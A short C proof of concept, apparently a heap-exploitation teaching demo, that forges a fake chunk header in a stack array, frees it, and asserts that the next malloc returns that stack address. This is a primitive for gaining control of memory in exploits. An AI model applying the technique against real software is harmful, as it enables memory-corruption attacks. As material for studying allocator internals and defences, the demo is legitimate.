
#include <stdlib.h>
#include <assert.h>
int main()
{
	malloc(1);
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10]; //fake chunk region
	fake_chunks[1] = 0x40; // this is the size
	a = &fake_chunks[2];
	free(a);
	void *b = malloc(0x30);
	assert((long)b == (long)&fake_chunks[2]);
}
